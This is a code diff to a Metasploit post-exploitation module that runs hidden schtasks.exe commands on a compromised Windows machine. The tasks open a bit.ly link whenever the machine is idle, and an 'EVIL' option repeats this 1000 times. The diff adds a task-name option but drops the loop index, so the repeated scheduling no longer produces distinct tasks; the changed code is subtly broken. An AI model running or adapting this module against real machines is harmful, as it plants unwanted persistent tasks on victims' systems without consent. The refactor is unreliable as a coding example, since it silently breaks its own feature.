@@ -34,7 +34,8 @@ class Metasploit3 < Msf::Post
 			[
 				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
                                 OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
-                                OptBool.new('EVIL', [false, 'Automatically migrate to explorer.exe', false ])
+				OptString.new('TASKNAME', [false, 'Task Name', 'RRLOL']),
+                                OptBool.new('EVIL', [false, 'schedule 1000 tasks', false ])
 			], self.class)
 
 	end
@@ -46,7 +47,7 @@ class Metasploit3 < Msf::Post
 			print_status "Disabling rickroll..."
 			if datastore['EVIL']
 				1000.times do |i|
-					disable_annoy("RRLOL",i)
+					disable_annoy(datastore['TASKNAME'])
 				end
 			else
 				disable_annoy
@@ -55,7 +56,7 @@ class Metasploit3 < Msf::Post
 			print_status "Enabling rickroll..."
 			if datastore['EVIL']
 				1000.times do |i|
-					enable_annoy("RRLOL",i)
+					enable_annoy(datastore['TASKNAME'])
 				end
 			else
 				enable_annoy
@@ -63,14 +64,14 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def enable_annoy(name="RRLOL",count=0)
+	def enable_annoy(name,count=0)
 		task_name = name + count.to_s
 		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start http://bit.ly/idn29F\" /SC ONIDLE /I 1"
 		print_status "Running #{target}"
 		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
 	end
 
-	def disable_annoy(name="RRLOL",count=0)
+	def disable_annoy(name,count=0)
 		task_name = name + count.to_s
 		target = "schtasks.exe /DELETE /F /TN #{task_name}"
 		print_status "Running #{target}"
